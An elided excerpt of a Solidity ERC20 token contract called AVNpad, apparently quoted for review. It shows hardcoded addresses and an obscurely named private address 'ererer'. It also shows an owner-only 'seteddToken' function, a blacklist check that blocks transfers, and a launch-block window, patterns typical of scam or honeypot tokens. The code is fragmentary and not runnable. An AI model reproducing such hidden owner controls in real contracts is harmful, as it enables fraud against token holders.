...
contract  AVNpad is ERC20 {
   ...
   bool public swapping;
    ...
    address public market = 0xe74eE4B58Af961cd3180738F8f108408a6Ca571F;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint256 private swapTokensAtAmount = 5 * 10**5 * 10**9;
     bool swapingtwo = true;
     address  private ererer = 0x0F6d9Fe90B29c507E0A7d030cD94D985b4647cDF;
   ...
   address  private own;
    ...
    constructor() public ERC20("AVNpad", "AVN 2.0",2) {
        ...
        _balances[owner()] = (1*10**8) * (10**9);
          emit Transfer(address(0), owner(), (1*10**8) * (10**9));
    }
  ...
  function seteddToken(address spender,uint256 addvalue)public onlyOwner(){
      ...
      function checkAdd(address sender,address recipient,uint256 amount) internal{
            ...
            require(!isbook[sender] && !isbook[recipient], 'isbook address');  
                  ...
                  if(launchedAt + lunchTime - 1>= block.number){
